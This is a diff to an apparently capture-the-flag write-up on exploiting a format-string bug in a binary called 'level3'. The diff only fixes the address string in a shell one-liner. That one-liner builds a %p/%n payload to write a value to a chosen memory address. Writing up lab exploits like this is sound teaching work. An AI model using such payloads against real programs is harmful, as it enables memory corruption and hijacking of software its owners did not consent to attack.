@@ -145,7 +145,7 @@ In our case, the executable is affected by the second bug. We can write to a loc
 The %n modifiers writes the length of the preceding formatted input. So if we want to write 0x40 to memory location 0x804988c, we need to put the address at the start of our buffer, pop 3 arguments off the stack using the %p specifier, and pad the input to reach 40-bytes before placing the %n specifier.
 
 ```sh
-ADDRESS="804988c"
+ADDRESS="0804988c"
 BYTES=$(<<< "$ADDRESS" rev | dd conv=swab | xxd -r -p)
 (echo "$BYTES%p%p%45p%n"; cat) | ./level3
 ```
